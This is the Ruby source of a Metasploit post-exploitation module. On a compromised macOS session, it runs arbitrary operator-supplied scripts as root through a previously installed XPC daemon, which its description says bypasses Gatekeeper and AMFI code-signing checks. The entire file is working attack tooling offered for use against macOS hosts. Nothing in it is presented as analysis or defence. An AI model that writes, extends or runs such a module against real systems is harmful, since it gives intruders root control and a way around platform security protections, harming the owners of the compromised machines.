require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::XPCDaemon

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'macOS XPC AMFI Bypass Unsigned Code Execution',
      'Description'   => %q{
        Executes arbitrary scripts or unsigned code as root via XPC daemon.
        Writes script to /tmp, chmod +x, executes, cleans up.
        Bypasses Gatekeeper and AMFI checks through daemon process context.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Mr.Gedik'],
      'Platform'      => ['osx'],
      'SessionTypes'  => ['meterpreter', 'shell']
    ))
    register_options([
      OptString.new('INTERPRETER', [true, 'Script interpreter', '/bin/bash']),
      OptString.new('SCRIPT',      [true, 'Script content to execute']),
    ])
  end

  def run
    unless xpc_client_exists?
      print_error('XPC client not found. Run xpc_daemon_install first.')
      return
    end
    interp = datastore['INTERPRETER']
    script = datastore['SCRIPT']
    print_status("Executing via #{interp} (#{script.length} bytes)...")
    result = xpc_exec("inj #{interp} #{script}", timeout: 30)
    if result && result['s'] == '1'
      print_good("Executed as root:")
      print_line(result['d'].to_s)
    else
      print_error("Execution failed: #{result&.dig('d') || 'unknown'}")
    end
  end
end
